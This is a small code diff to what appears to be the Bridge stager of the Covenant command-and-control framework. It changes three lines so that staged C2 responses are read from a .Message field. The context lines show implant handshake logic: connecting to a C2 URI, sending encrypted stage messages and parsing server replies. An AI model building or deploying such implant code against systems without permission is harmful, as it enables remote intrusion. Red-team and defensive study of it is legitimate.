@@ -58,7 +58,7 @@ namespace GruntStager
                 BridgeMessenger messenger = new BridgeMessenger(CovenantURI, GUID, ProfileWriteFormat);
 				messenger.Connect();
 				messenger.Write(String.Format(ProfileWriteFormat, transformedResponse, GUID));
-                string Stage0Response = messenger.Read();
+                string Stage0Response = messenger.Read().Message;
                 string extracted = Parse(Stage0Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 List<string> parsed = Parse(extracted, MessageFormat);
@@ -88,7 +88,7 @@ namespace GruntStager
                 transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));
                 string formatted = String.Format(ProfileWriteFormat, transformedResponse, GUID);
 				messenger.Write(formatted);
-				string Stage1Response = messenger.Read();
+				string Stage1Response = messenger.Read().Message;
                 extracted = Parse(Stage1Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
@@ -113,7 +113,7 @@ namespace GruntStager
                 string Stage2Body = String.Format(MessageFormat, GUID, "2", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));
                 transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));
                 messenger.Write(String.Format(ProfileWriteFormat, transformedResponse, GUID));
-				string Stage2Response = messenger.Read();
+				string Stage2Response = messenger.Read().Message;
                 extracted = Parse(Stage2Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
